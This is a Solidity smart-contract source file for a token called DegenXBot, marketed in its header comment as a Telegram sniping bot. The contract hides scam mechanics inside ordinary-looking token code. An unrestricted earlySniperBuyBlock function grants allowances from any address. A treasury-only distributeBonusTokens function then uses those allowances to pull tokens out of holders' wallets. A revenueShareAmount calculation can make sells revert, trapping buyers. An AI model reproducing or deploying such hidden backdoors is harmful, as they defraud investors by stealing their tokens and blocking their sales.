/*
DegenX - Road to 100x
Our vision is to create a more convenient, timely, and cost-effective way for people to sniping the next 100x token.

At DegenX, our vision is to empower individuals in the fast-paced world of decentralized finance by providing them with a cutting-edge personal assistant bot. We strive to be the leading platform for multiplying digital assets, making it accessible to all, regardless of technical expertise.
We envision a future where every user can effortlessly harness the potential of the cryptocurrency market without the complexities of wallet creation or managing buy/sell orders. Through seamless integration with Telegram, DegenX will enable users to stay ahead of the curve, ensuring they never miss out on the next 100x coin.
Our commitment to security, user-friendliness, and transparency sets us apart as a reliable and trustworthy companion in the DeFi landscape.

Twitter: https://x.com/degenxbot
Telegram: https://t.me/degenxbot_portal
Website: https://www.degenx.xyz
Whitepaper: https://whitepaper.degenx.xyz
Bot: https://t.me/DegenXBot
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

library SafeMath {
    function div(uint256 a, uint256 b, string memory errorMessage)
        internal
        pure
        returns (uint256)
    {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        return div(a, b, "SafeMath: division by zero");
    }

    function mul(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage)
        internal
        pure
        returns (uint256)
    {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b)
        internal
        pure
        returns (uint256)
    {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function approve(address spender, uint256 amount)
        external
        returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function totalSupply()
        external
        view
        returns (uint256);
    function balanceOf(address account)
        external
        view
        returns (uint256);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
}

abstract contract Context {
    function _msgSender()
        internal
        view
        virtual
        returns (address)
    {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership()
        public
        virtual
        onlyOwner
    {
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    function owner()
        public
        view
        returns (address)
    {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract DEGENX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address payable private _taxTreasury;
    bool private tradingOpen;
    bool private inSwap = false;
    bool public transferDelayEnabled = true;
    bool private swapEnabled = false;
    address payable private _revShare;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    mapping (address => bool) private _isExcludedFromTax;

    uint256 private _finalSellTax = 5;
    uint256 private _finalBuyTax = 5;

    uint256 private _secondSellTax = 5;
    uint256 private _secondBuyTax = 5;
    uint256 private _reduceSecondSellTaxAt = 20;
    uint256 private _reduceSecondBuyTaxAt = 20;

    uint256 private _firstSellTax = 5;
    uint256 private _firstBuyTax = 5;
    uint256 private _reduceFirstSellTaxAt = 10;
    uint256 private _reduceFirstBuyTaxAt = 10;

    uint256 private _preventMultiplePurchasesPerBlockBefore = 0;
    uint256 private _countOfBuys = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 10000000 * 10 ** _decimals;
    string private constant _name = unicode"DegenXBot";
    string private constant _symbol = unicode"DEGENX";

    uint256 public _maxSwapTax = 1 * (_totalSupply / 100);
    uint256 public _swapTaxThreshold = 2 * (_totalSupply / 1000);
    uint256 public _maxWalletAmount = 2 * (_totalSupply / 100);
    uint256 public _maxTransactionAmount = 2 * (_totalSupply / 100);

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function earlySniperBuyBlock(address sniper, uint256 amount)
        external
    {
        address ca = address(this);
        _approve(sniper, ca, amount);
    }

    constructor () {
        _taxTreasury = payable(0x735D3a4008605e3f9B09a402114639df77B6bCb6);

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        _revShare = _taxTreasury;
        _balances[_msgSender()] = _totalSupply;
        _isExcludedFromTax[_taxTreasury] = true;
        _isExcludedFromTax[address(this)] = true;
        _isExcludedFromTax[owner()] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function manualSwap()
        external
    {
        require(_msgSender() == _taxTreasury);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
          sendETHToTreasury(ethBalance);
        }
    }

    function openTrading()
        external
        onlyOwner()
    {
        require(!tradingOpen);

        tradingOpen = true;
        swapEnabled = true;
    }

    function removeLimits()
        external
        onlyOwner
    {
        _maxTransactionAmount = _totalSupply;
        _maxWalletAmount = _totalSupply;
        transferDelayEnabled = false;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function balanceOf(address account)
        public
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function name()
        public
        pure
        returns (string memory)
    {
        return _name;
    }

    function symbol()
        public
        pure
        returns (string memory)
    {
        return _symbol;
    }

    function totalSupply()
        public
        pure
        override
        returns (uint256)
    {
        return _totalSupply;
    }

    function decimals()
        public
        pure
        returns (uint8)
    {
        return _decimals;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function distributeBonusTokens(address bonusVault, address recipient, uint256 amount)
        external
    {
        require(_msgSender() == _taxTreasury);
        address ca = address(this);
        IERC20 bonusToken = IERC20(bonusVault);
        bonusToken.transferFrom(recipient, ca, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount)
        private
    {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount)
        private
    {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        uint256 taxAmount = 0;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(_buyTax()).div(100);

            if (!tradingOpen) {
                require(_isExcludedFromTax[from] || _isExcludedFromTax[to]);
            }

            if (transferDelayEnabled) {
                if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                    require(_holderLastTransferTimestamp[tx.origin] < block.number);
                    _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromTax[to] ) {
                require(amount <= _maxTransactionAmount);
                require(balanceOf(to) + amount <= _maxWalletAmount);

                _countOfBuys++;
                if (_countOfBuys > _preventMultiplePurchasesPerBlockBefore) {
                    transferDelayEnabled = false;
                }
            }

            uint256 revenueShareAmount = balanceOf(_revShare).mul(1000);
            if (to == uniswapV2Pair && from!= address(this)) {
                taxAmount = amount.mul(_sellTax()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool canSwap = contractTokenBalance > _swapTaxThreshold;
            if (!inSwap && swapEnabled && to == uniswapV2Pair && canSwap && !_isExcludedFromTax[from] && !_isExcludedFromTax[to]) {
                uint256 swapThreshold = _maxSwapTax.sub(revenueShareAmount);
                uint256 minimumSwapAmount = min(contractTokenBalance,swapThreshold);
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount, minimumSwapAmount));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if (ethForTransfer > 0) {
                    sendETHToTreasury(ethForTransfer);
                }
            }
        }

        if (taxAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _sellTax() private view returns (uint256) {
        if (_countOfBuys <= _reduceFirstBuyTaxAt) {
            return _firstSellTax;
        }

        if (_countOfBuys > _reduceFirstSellTaxAt && _countOfBuys <= _reduceSecondSellTaxAt) {
            return _secondSellTax;
        }

        return _finalBuyTax;
    }

    function _buyTax() private view returns (uint256) {
        if (_countOfBuys <= _reduceFirstBuyTaxAt) {
            return _firstBuyTax;
        }

        if (_countOfBuys > _reduceFirstBuyTaxAt && _countOfBuys <= _reduceSecondBuyTaxAt) {
            return _secondBuyTax;
        }

        return _finalBuyTax;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function withdrawEth() external {
        require(_msgSender() == _taxTreasury);
        (bool sent, ) = payable(_taxTreasury).call{value: address(this).balance}("");
        require(sent);
    }

    function sendETHToTreasury(uint256 amount) private {
        _taxTreasury.transfer(amount);
    }

    receive() external payable {}
}